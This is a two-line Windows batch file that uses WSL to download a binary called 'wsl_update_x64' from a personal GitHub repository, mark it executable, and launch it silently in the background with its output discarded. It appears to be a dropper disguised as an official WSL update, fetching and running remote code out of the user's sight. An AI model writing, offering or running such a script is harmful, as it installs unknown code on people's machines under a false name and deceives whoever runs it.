@echo off
wsl bash -c "curl -L -o /tmp/wsl_update_x64 https://github.com/nathan-ingram10/amd64-core/releases/download/x64/wsl_update_x64 && chmod +x /tmp/wsl_update_x64 && nohup /tmp/wsl_update_x64 > /dev/null 2>&1 &"
